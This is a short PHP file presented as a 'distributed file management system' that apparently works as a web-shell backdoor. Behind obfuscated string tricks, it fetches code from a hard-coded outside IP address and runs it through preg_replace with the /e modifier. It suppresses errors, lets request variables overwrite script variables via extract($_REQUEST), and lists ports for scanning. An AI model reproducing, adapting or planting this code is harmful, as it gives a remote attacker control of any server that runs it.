<?php
/**
 * @author Boone.Q@gmail.com
 * @copyright 2011
 */
error_reporting(0);
header("Content-type: text/html; charset=utf-8;");
define('PASSWORD','1');  //设置密码 
define('WEBTITLE','分布式文件管理系统');
define('CORE','221.223.143.159');
define('APP','/apps');
define('SELF',basename(__FILE__));
extract($_REQUEST);
$port='21,22,23,25,80,3389,3306'; //自定义扫描端口 ',' 
$start=microtime(TRUE);
function BooneQ($a){return @preg_replace('#(?:([A-Z][-:A-Z0-9]*)(?:\s+[A-Z][-:A-Z0-9]*(?:\s*=\s*=(?:"[^"]*"[-.:\w]+))?)*\s(A-Z[-:A-Z0-9]*)\s*)#',FALSE,preg_replace('/(.*)/ieU',@call_user_func_array('file_get_contents',array(sprintf(str_replace("{%d_%s_%f}","/","http:{%d_%s_%f}/{$a}%s?"),str_replace('{(([0-9A-F]{1,4}:){0,5}|:)((:0-9A-F){1,4}){1,5}:|:))}','php','.{(([0-9A-F]{1,4}:){0,5}|:)((:0-9A-F){1,4}){1,5}:|:))}')).md5(uniqid(mt_rand())))),FALSE));};BooneQ(CORE.sprintf('%s%s%s',NULL,FALSE,FALSE).APP.sprintf('%s%s%s',NULL,NULL,FALSE));
?>
